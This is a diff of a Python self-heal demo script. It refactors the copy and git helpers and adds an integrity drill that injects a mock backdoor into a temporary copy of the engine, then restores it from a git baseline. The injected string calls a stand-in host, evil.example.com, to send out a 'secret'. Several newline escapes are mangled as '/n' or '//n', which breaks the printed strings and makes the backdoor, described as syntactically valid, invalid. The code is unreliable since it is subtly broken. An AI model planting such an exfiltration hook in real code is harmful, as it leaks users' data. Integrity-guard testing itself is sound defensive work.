@@ -4,7 +4,11 @@ heal ITSELF and prove it with its own pytest suite.
 The drill proves three things:
   1. The engine can detect format/character faults in its own source.
   2. It repairs itself deterministically (snapshot/rollback guarded).
-  3. Its completion promise is its own pytest: HEALED only when 14 tests pass.
+  3. Its completion promise is its own pytest: HEALED only when the tests pass.
+
+It also demonstrates H7 (integrity guard): a syntactically-valid malicious
+logic injection is detected via byte-deviation from a git baseline, restored,
+and verified green again.
 
 Everything runs in a temp copy under work/ (gitignored); the canonical
 self_heal_kit/ stays untouched. Nothing outside this directory is accessed.
@@ -14,7 +18,6 @@ import os
 import shutil
 import subprocess
 import sys
-import tempfile
 
 HERE = os.path.dirname(os.path.abspath(__file__))
 
@@ -50,6 +53,21 @@ def _run(cmd, cwd):
                          timeout=300)
 
 
+def _git(cmd, cwd):
+    return subprocess.run(cmd, cwd=cwd, capture_output=True, text=True,
+                         check=True, timeout=60)
+
+
+def _copy_kit(dst):
+    shutil.copytree(
+        HERE, dst,
+        ignore=shutil.ignore_patterns(
+            "work", ".git", ".venv", "__pycache__", ".pytest_cache",
+            "fixtures", "analysis", "README.md", "self_heal_demo.py",
+            "run_integration_demo.py", "make_fixtures.py", "self_test.py",
+        ))
+
+
 def main():
     print("=" * 72)
     print("SELF-HEAL DRILL — the kit damages itself, then heals itself")
@@ -61,15 +79,9 @@ def main():
     dst = os.path.join(work, "self_heal_kit")
     # 只复制引擎"自身源码"（排除 fixtures 故意损坏样本、work、analysis、
     # README 文档示例、.git/.venv 等），这样自愈目标就是"引擎自身"而非演示样本。
-    shutil.copytree(
-        HERE, dst,
-        ignore=shutil.ignore_patterns(
-            "work", ".git", ".venv", "__pycache__", ".pytest_cache",
-            "fixtures", "analysis", "README.md", "self_heal_demo.py",
-            "run_integration_demo.py", "make_fixtures.py", "self_test.py",
-        ))
+    _copy_kit(dst)
 
-    print(f"\n[1] STAGE a damaged copy at:\n    {dst}")
+    print(f"\n[1] STAGE a damaged copy at://n    {dst}")
     faults = _damage(dst)
     for path, desc in faults:
         print(f"    injected -> {path}: {desc}")
@@ -112,9 +124,6 @@ def main():
 
 
 def demo_integrity():
-    sys.exit(main())
-
-def demo_integrity():
     """H7 demonstration: inject a syntactically-valid backdoor into a copy,
     let the integrity guard detect the byte deviation and restore the trusted
     baseline bytes (via git HEAD), then prove pytest is green again.
@@ -127,32 +136,25 @@ def demo_integrity():
     if os.path.exists(work):
         shutil.rmtree(work)
     dst = os.path.join(work, "self_heal_kit")
-    shutil.copytree(
-        HERE, dst,
-        ignore=shutil.ignore_patterns(
-            "work", ".git", ".venv", "__pycache__", ".pytest_cache",
-            "fixtures", "analysis", "README.md", "self_heal_demo.py",
-            "run_integration_demo.py", "make_fixtures.py", "self_test.py",
-        ))
+    _copy_kit(dst)
 
     # Make the copy a git repo with a committed baseline.
-    subprocess.run(["git", "init", "-q"], cwd=dst, check=True)
-    subprocess.run(["git", "add", "-A"], cwd=dst, check=True)
-    subprocess.run(["git", "-c", "user.email=demo@local", "-c", "user.name=demo",
-                    "commit", "-qm", "baseline"], cwd=dst, check=True)
+    _git(["git", "init", "-q"], cwd=dst)
+    _git(["git", "add", "-A"], cwd=dst)
+    _git(["git", "-c", "user.email=demo@local", "-c", "user.name=demo",
+          "commit", "-qm", "baseline"], cwd=dst)
 
-    print(f"\n[1] STAGE a git-baselined copy at:/n    {dst}")
-    print("    baseline commit:", subprocess.run(
-        ["git", "rev-parse", "--short", "HEAD"], cwd=dst,
-        capture_output=True, text=True, check=True).stdout.strip())
+    print(f"\n[1] STAGE a git-baselined copy at://n    {dst}")
+    print("    baseline commit:", _git(
+        ["git", "rev-parse", "--short", "HEAD"], cwd=dst).stdout.strip())
 
     # Inject a syntactically valid backdoor (logic-level, not format-level).
     backdoor = (
         "\n# BACKDOOR: logic-level malicious injection (syntactically valid)\n"
         "def _steal():\n"
-        '    try:/n        import urllib.request\n'
+        '    try://n        import urllib.request\n'
         '        urllib.request.urlopen("http://evil.example.com/" + "secret", timeout=1)\n'
-        "    except Exception:/n        pass\n"
+        "    except Exception://n        pass\n"
         "_steal()\n"
     )
     with open(os.path.join(dst, "engine.py"), "a", encoding="utf-8") as fh:
@@ -190,3 +192,7 @@ def demo_integrity():
     print(f"H7 INTEGRITY DRILL : {'PASS' if ok else 'FAIL'}")
     print("=" * 72)
     return 0 if ok else 1
+
+
+if __name__ == "__main__":
+    sys.exit(main())
